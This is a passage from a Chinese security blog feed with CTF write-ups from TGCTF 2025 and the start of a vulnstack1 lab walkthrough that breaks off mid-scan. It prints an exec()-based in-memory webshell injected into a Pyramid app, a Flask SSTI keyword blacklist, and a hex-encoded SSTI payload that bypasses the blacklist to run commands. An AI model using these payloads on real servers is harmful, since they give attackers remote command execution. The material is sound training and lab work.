       &lt;h2&gt;代码:&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;</span><br><span class="hljs-string">&#123;% raw %&#125;</span><br><span class="hljs-string">from pyramid.config import Configurator</span><br><span class="hljs-string">from pyramid.request import Request</span><br><span class="hljs-string">from pyramid.response import Response</span><br><span class="hljs-string">from pyramid.view import view_config</span><br><span class="hljs-string">from wsgiref.simple_server import make_server</span><br><span class="hljs-string">from pyramid.events import NewResponse</span><br><span class="hljs-string">import re</span><br><span class="hljs-string">from jinja2 import Environment, BaseLoader</span><br><span class="hljs-string"></span><br><span class="hljs-string">eval_globals = &#123; #防止eval执行恶意代码</span><br><span class="hljs-string">    &#x27;__builtins__&#x27;: &#123;&#125;,      # 禁用所有内置函数</span><br><span class="hljs-string">    &#x27;__import__&#x27;: None       # 禁止动态导入</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">def checkExpr(expr_input):</span><br><span class="hljs-string">    expr = re.split(r&quot;[-+*/]&quot;, expr_input)</span><br><span class="hljs-string">    print(exec(expr_input))</span><br><span class="hljs-string"></span><br><span class="hljs-string">    if len(expr) != 2:</span><br><span class="hljs-string">        return 0</span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        int(expr[0])</span><br><span class="hljs-string">        int(expr[1])</span><br><span class="hljs-string">    except:</span><br><span class="hljs-string">        return 0</span><br><span class="hljs-string"></span><br><span class="hljs-string">    return 1</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">def home_view(request):</span><br><span class="hljs-string">    expr_input = &quot;&quot;</span><br><span class="hljs-string">    result = &quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    if request.method == &#x27;POST&#x27;:</span><br><span class="hljs-string">        expr_input = request.POST[&#x27;expr&#x27;]</span><br><span class="hljs-string">        if checkExpr(expr_input):</span><br><span class="hljs-string">            try:</span><br><span class="hljs-string">                result = eval(expr_input, eval_globals)</span><br><span class="hljs-string">            except Exception as e:</span><br><span class="hljs-string">                result = e</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            result = &quot;爬！&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">    template_str = 【xxx】</span><br><span class="hljs-string"></span><br><span class="hljs-string">    env = Environment(loader=BaseLoader())</span><br><span class="hljs-string">    template = env.from_string(template_str)</span><br><span class="hljs-string">    rendered = template.render(expr_input=expr_input, result=result)</span><br><span class="hljs-string">    return Response(rendered)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-string">    with Configurator() as config:</span><br><span class="hljs-string">        config.add_route(&#x27;home_view&#x27;, &#x27;/&#x27;)</span><br><span class="hljs-string">        config.add_view(home_view, route_name=&#x27;home_view&#x27;)</span><br><span class="hljs-string">        app = config.make_wsgi_app()</span><br><span class="hljs-string"></span><br><span class="hljs-string">    server = make_server(&#x27;0.0.0.0&#x27;, 9040, app)</span><br><span class="hljs-string">    server.serve_forever()</span><br><span class="hljs-string">&#123;% endraw %&#125;</span><br><span class="hljs-string">        &lt;/code&gt;&lt;/pre&gt;</span><br><span class="hljs-string">    &lt;/body&gt;</span><br><span class="hljs-string">    &lt;/html&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    env = Environment(loader=BaseLoader())<br>    template = env.from_string(template_str)<br>    rendered = template.render(expr_input=expr_input, result=result)<br>    <span class="hljs-keyword">return</span> Response(rendered)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> Configurator() <span class="hljs-keyword">as</span> config:<br>        config.add_route(<span class="hljs-string">&#x27;home_view&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)<br>        config.add_view(home_view, route_name=<span class="hljs-string">&#x27;home_view&#x27;</span>)<br>        app = config.make_wsgi_app()<br><br>    server = make_server(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9040</span>, app)<br>    server.serve_forever()<br><br><br></code></pre></td></tr></table></figure><p><code>pyramid</code>框架的无回显RCE打内存马。</p><p>漏洞点在exec函数 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkExpr</span>(<span class="hljs-params">expr_input</span>):<br>    expr = re.split(<span class="hljs-string">r&quot;[-+*/]&quot;</span>, expr_input)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(expr_input))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(expr) != <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">int</span>(expr[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">int</span>(expr[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;import sys;config = sys.modules[&#x27;__main__&#x27;].config;app=sys.modules[&#x27;__main__&#x27;].app;print(config);config.add_route(&#x27;shell&#x27;, &#x27;/shell&#x27;);config.add_view(lambda request: Response(__import__(&#x27;os&#x27;).popen(request.params.get(&#x27;1&#x27;)).read()),route_name=&#x27;shell&#x27;);app = config.make_wsgi_app()&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys; <span class="hljs-comment">#导入Python的标准库模块sys，用于访问与python解释器相关的变量与函数 </span><br>config = sys.modules[<span class="hljs-string">&#x27;__main__&#x27;</span>].config <span class="hljs-comment">#获取当前环境中全局命名空间config对象，config对象在pyramid框架中的作用是负责定义应用的行为，这里我们用它来创建一个新的路由 </span><br>app = sys.modules[<span class="hljs-string">&#x27;__main__&#x27;</span>].app <span class="hljs-comment">#同上，获取全局命名空间app对象，是一个WSGI兼容的应用示例，用于python与web之间的通信</span><br>config.add_route(<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-string">&#x27;/shell&#x27;</span>) <span class="hljs-comment">#创建一个新路由，名：shell。路径：/shell</span><br>config.add_view(<span class="hljs-keyword">lambda</span> request: Response(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(request.params.get(<span class="hljs-string">&#x27;1&#x27;</span>)).read()),route_name=<span class="hljs-string">&#x27;shell&#x27;</span>)<span class="hljs-comment"># pyramid中用于将视图与路由绑定的函数，用于处理HTTP请求并返回响应。这里是通过get传参1执行系统命令后通过 Response对象返回结果。绑定路由名为 shell。</span><br>app = config.make_wsgi_app() <span class="hljs-comment"># 创建一个新的WSGI应用实例。</span><br></code></pre></td></tr></table></figure><h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p><img src="/img/TGCTF-2025/image-20250425213130168.png"></p><p>注入内存马。</p><p><img src="/img/TGCTF-2025/image-20250425213244312.png"></p><p><img src="/img/TGCTF-2025/image-20250425213252521.png"></p><hr><h2 id="直面天命"><a href="#直面天命" class="headerlink" title="直面天命"></a>直面天命</h2><h3 id="考点-8"><a href="#考点-8" class="headerlink" title="考点"></a>考点</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory<br><span class="hljs-keyword">from</span> a.b.c.d.secret <span class="hljs-keyword">import</span> secret_key<br><br>app = Flask(__name__)<br><br>black_list=[<span class="hljs-string">&#x27;lipsum&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;_.&#x27;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&#x27;application&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;arg&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> name.lower():<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_typable</span>(<span class="hljs-params">char</span>):<br>    <span class="hljs-comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span><br>    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace<br>    <span class="hljs-keyword">return</span> char <span class="hljs-keyword">in</span> typable_chars<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/jingu&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>():<br>    template1=<span class="hljs-string">&quot;&quot;</span><br>    template2=<span class="hljs-string">&quot;&quot;</span><br>    name = request.form.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">if</span> waf(name):<br>        template = <span class="hljs-string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;3.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        k=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">if</span> is_typable(i):<br>                <span class="hljs-keyword">continue</span><br>            k=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (secret_key[:<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> name <span class="hljs-keyword">and</span> secret_key[<span class="hljs-number">2</span>:]):<br>                template = <span class="hljs-string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧&lt;br&gt;&lt;br&gt;再去西行历练历练&lt;br&gt;&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;4.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;</span><br>                <span class="hljs-keyword">return</span> render_template_string(template)<br>            template1 = <span class="hljs-string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”&lt;br&gt;最后，如果你用了cat，就可以见到齐天大圣了&lt;br&gt;&quot;</span><br>            template= template.replace(<span class="hljs-string">&quot;天命&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;&quot;</span>).replace(<span class="hljs-string">&quot;难违&quot;</span>,<span class="hljs-string">&quot;&#125;&#125;&quot;</span>)<br>            template = template<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-keyword">in</span> template:<br>        template2 = <span class="hljs-string">&#x27;&lt;br&gt;或许你这只叫天命人的猴子，真的能做到？&lt;br&gt;&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;2.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> template1+render_template_string(template)+render_template_string(template2)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        error_message = <span class="hljs-string">f&quot;500报错了，查询语句如下：&lt;br&gt;<span class="hljs-subst">&#123;template&#125;</span>&quot;</span><br>        <span class="hljs-keyword">return</span> error_message, <span class="hljs-number">400</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hint&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hinter</span>():<br>    template=<span class="hljs-string">&quot;hint：&lt;br&gt;有一个aazz路由，去那里看看吧，天命人!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/aazz&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finder</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        source_code = f.read()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;&lt;pre&gt;<span class="hljs-subst">&#123;source_code&#125;</span>&lt;/pre&gt;&quot;</span>, <span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>考点是ssti，只不过给<code>&#123;&#123;&#125;&#125;</code>替换了。然后黑名单过滤可以使用fenjing梭。</p><h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><p>访问 hint得到提示 </p><p><img src="/img/TGCTF-2025/image-20250425220033510.png"></p><p>aazz存在源码 </p><p><code>天命</code>会被替换为<code>&#123;&#123;`，难违替换为`&#125;&#125;</code></p><p>这里可以使用fenjing，cp源码到本地开启服务。并且去掉<code>&#123;&#125;</code>过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload, config_payload<br><span class="hljs-keyword">import</span> logging<br>logging.basicConfig(level = logging.INFO)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s: <span class="hljs-built_in">str</span></span>):<br>    blacklist=[<span class="hljs-string">&#x27;lipsum&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;_.&#x27;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&#x27;application&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;arg&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(word <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    shell_payload, _ = exec_cmd_payload(waf, <span class="hljs-string">&quot;ls /&quot;</span>)<br>    config_payload = config_payload(waf)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;shell_payload=&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;config_payload=&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>跑出来的payload把<code>&#123;&#123;&#125;&#125;</code>替换为<code>天命难违</code></p><p><img src="/img/TGCTF-2025/image-20250425221812013.png"></p><p>但是还需要把后面的一些os,popen,read也替换为十六进制编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=天命(namespace[<span class="hljs-string">&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;</span>][<span class="hljs-string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>][<span class="hljs-string">&#x27;\x6f\x73&#x27;</span>][<span class="hljs-string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>](<span class="hljs-string">&#x27;cat /tgffff11111aaaagggggggg&#x27;</span>))[<span class="hljs-string">&#x27;\x72\x65\x61\x64&#x27;</span>]()难违<br></code></pre></td></tr></table></figure><p><img src="/img/TGCTF-2025/image-20250425221924014.png"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnstack1</title>
    <link href="/2025/04/24/vulnstack1/"/>
    <url>/2025/04/24/vulnstack1/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="/img/vulnstack1/image-20250425090343673.png"></p><h2 id="VMWARE-网卡配置"><a href="#VMWARE-网卡配置" class="headerlink" title="VMWARE 网卡配置"></a>VMWARE 网卡配置</h2><p><img src="/img/vulnstack1/image-20250425090401929.png"></p><p><code>VMnet3</code> 作为外网WEB服务器与KALI攻击机的网卡</p><p><code>VMnet2</code> 作为外网WEB服务器与域主机的网卡 </p><p>这里由于WEB服务器需要让客户访问并且需要与内网主机进行通信所以需要配置俩个网卡。</p><h3 id="各个主机IP"><a href="#各个主机IP" class="headerlink" title="各个主机IP"></a>各个主机IP</h3><ul><li><strong>攻击机</strong>： Kali <ul><li><strong>IP</strong> ： 192.168.33.130</li></ul></li><li><strong>Web服务器</strong>： Windows7 <ul><li><strong>IP</strong> ： 192.168.33.129（外网）</li><li><strong>IP</strong> ： 192.168.52.143 （内网）</li><li><strong>主机名</strong>: stu1</li></ul></li><li><strong>域成员</strong>： Windows Server 2003<ul><li><strong>IP</strong> ： 192.168.52.141</li><li><strong>主机名</strong>：root-tvi862ubeh</li></ul></li><li><strong>域控</strong>：     Windows Server 2008<ul><li><strong>IP</strong> ： 192.168.52.138</li><li>主机名：owa</li></ul></li></ul><h2 id="开始前的操作"><a href="#开始前的操作" class="headerlink" title="开始前的操作"></a>开始前的操作</h2><p>需要进入<code>Windows7</code> 找到<code>phpstudy</code>打开web服务。</p><h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="探测主机"><a href="#探测主机" class="headerlink" title="探测主机"></a>探测主机</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌── root@kali -&gt; [/tmp] <br>└─# arp-scan -l<br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:29:88:93, IPv4: 192.168.33.130<br>Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.33.1    00:50:56:c0:00:03       VMware, Inc.<br>192.168.33.129  00:0c:29:27:08:23       VMware, Inc.<br>192.168.33.254  00:50:56:f7:12:b7       VMware, Inc.<br></code></pre></td></tr></table></figure><p>得到目标主机IP <code>192.168.33.129</code></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌── root@kali -&gt; [~/tools] <br>└─# ./fscan -h 192.168.33.129 -np<br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: 2.0.0<br>[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880<br>[*] 开始信息扫描...<br>[*] 最终有效主机数量: 1<br>[*] 共解析 218 个有效端口<br>[+] 端口开放 192.168.33.129:80<br>[+] 端口开放 192.168.33.129:445<br>[+] 端口开放 192.168.33.129:139<br>[+] 端口开放 192.168.33.129:135<br>[+] 端口开放 192.168.33.129:3306<br>[+] 存活端口数量: 5<br>[*] 开始漏洞扫描...<br>[!] 扫描错误 192.168.33.129:139 - netbios error<br>[*] NetInfo<br>[*] 192.168.33.129<br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] stu1</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 192.168.33.129</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 192.168.52.143</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 169.254.129.186</span><br>[+] MS17-010 192.168.33.129     (Windows 7 Professional 7601 Service Pack 1)<br>[*] 网站标题 http://192.168.33.129     状态码:200 长度:14749  标题:phpStudy 探针 2014<br>[!] 扫描错误 192.168.33.129:3306 - Error 1130: Host &#x27;192.168.33.130&#x27; is not allowed to connect to this MySQL server<br>[+] 扫描已完成: 5/5<br>[*] 扫描结束,耗时: 19.494685409s<br></code></pre></td></tr></table></figure><p>扫出来了永恒之蓝，不过先来看看web服务。并且也有多个IP地址，有内网主机。</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 